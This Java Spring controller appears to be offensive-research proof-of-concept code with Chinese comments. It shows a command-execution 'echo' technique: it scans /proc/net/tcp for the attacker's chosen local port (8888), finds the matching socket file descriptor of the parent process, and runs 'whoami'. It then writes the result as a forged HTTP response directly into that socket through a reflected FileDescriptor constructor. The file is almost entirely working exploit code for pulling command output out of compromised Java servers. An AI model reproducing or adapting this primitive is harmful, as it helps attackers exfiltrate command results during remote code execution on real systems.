package com.firebasky.echo.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class socket {
    @RequestMapping("/socket")
    public String test(){
        try{
            //获取文件描述符  局限有点大 ubu 没有成功。。
            String[] cmd = new String[]{"/bin/sh","-c","inode=`cat /proc/net/tcp|awk '{if($10>0)print}'|awk '{print $3,$10}'|grep -i 22B8|awk '{print $2}'`;fd=`ls -l /proc/$PPID/fd|grep $inode|awk '{print $9}'`;echo -n $fd"};
            //22B8===> 8888
            // curl --local-port 8888 target
            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
            java.io.BufferedReader br = new java.io.BufferedReader(isr);
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null){
                stringBuilder.append(line);
            }
            int fd = Integer.valueOf(stringBuilder.toString()).intValue();


            //获取命令执行结果
            cmd = new String[]{"/bin/sh","-c","whoami"};
            in = Runtime.getRuntime().exec(cmd).getInputStream();
            isr = new java.io.InputStreamReader(in);
            br = new java.io.BufferedReader(isr);
            stringBuilder = new StringBuilder();
            while ((line = br.readLine()) != null){
                stringBuilder.append(line);
            }
            String result = stringBuilder.toString();

            //拼装成正常的HTTP响应
            String response = "HTTP/1.1 200 OK\r\n"
                    + "Content-Type: text/html\r\n"
                    + "Content-Length: " + result.length()
                    + "\r\n\r\n"
                    + result
                    + "\r\n\r\n";

            //写入socket
            java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
            c.setAccessible(true);
            java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));
            os.write(response.getBytes());
            os.close();
        }catch (Exception e){
            e.printStackTrace();
        }
        return "test";
    }
}